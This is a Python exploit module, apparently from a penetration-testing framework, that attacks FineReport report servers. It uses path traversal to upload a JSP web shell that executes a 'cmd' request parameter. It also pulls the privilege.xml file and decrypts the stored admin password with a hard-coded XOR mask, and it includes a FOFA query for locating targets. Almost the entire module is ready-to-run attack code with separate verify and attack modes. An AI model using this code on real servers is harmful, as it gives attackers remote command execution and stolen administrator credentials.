from lib.util.exprequest import ExpRequest
from lib.util.output import Output
from lib.clasetting import random_str
import lib.util.globalvar as GlobalVar
class finereport():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.flag = GlobalVar.get_value('flag')
            
    def reportServer_upload(self):
        appName = 'finereport'
        pocname = 'reportServer_upload'
        method = 'post'
        desc = 'finereport:CVE_20210408'
        info = '[upload]'
        path = r'/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/'
        payload_verify = '{"__CONTENT__":{},"__CHARSET__":"UTF-8"}'.format(self.flag)
        payload = r'{"__CONTENT__":"<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>","__CHARSET__":"UTF-8"}'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 
            'Connection': 'close', 
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*', 
            'Content-Type': 'text/xml;charset=UTF-8', 
            'Accept-Au': '0c42b2f264071be0507acea1876c74'
        }
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        name = random_str(6)+'.jsp'
        path += name
        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.post(self.url + path, data=payload_verify, headers=headers)
                request = exprequest.get(self.url + '/WebReport/' + name, headers=headers)
                if self.flag in request.text:
                    return output.echo_success(method, info)
                else:
                    return output.fail()
            #_attack
            else:
                request = exprequest.post(self.url + path, data=payload, headers=headers)
                print(self.url + path)
        except Exception as error:
            return output.error_output(str(error))
        
    def reportServer_dataleak(self):
        """
        fofa: body="isSupportForgetPwd"
        """
        appName = 'finereport'
        pocname = 'reportServer_dataleak'
        method = 'get'
        info = '[data]'
        paths = [
            '/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml',
            '/report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml'
        ]
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            #_verify
            if self.vuln == 'False':
                for path in paths:
                    r = exprequest.get(self.url+path)
                    if r.status_code == 200 and '<?xml' in r.text:
                        return output.echo_success(method, self.url+path)
                return output.fail()
            #_attack
            else:
                import re
                for path in paths:
                    r = exprequest.get(self.url+path)
                    if r.status_code == 200 and '<?xml' in r.text:
                        pattern = r'___([0-9a-zA-Z]+)'
                        match = re.search(pattern, r.text)
                        if match:
                            result = match.group(0)
                            print('Password: %s'%decodecipher(result))
        except Exception as error:
            return output.error_output(str(error))

def decodecipher(cipher):
    # 密文
    # cipher = '___0072002a00670066000a'
    # 掩码
    PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23]
    Password = ""
    # 截断三位后
    cipher = cipher[3:]
    for i in range(int(len(cipher) / 4)):
        c1 = int("0x" + cipher[i * 4:(i + 1) * 4], 16)
        c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8]
        Password = Password + chr(c2)
    return Password

def check(**kwargs):
    thread_list = []
    ExpFineReport = finereport(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(ExpFineReport, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(finereport):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(ExpFineReport, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)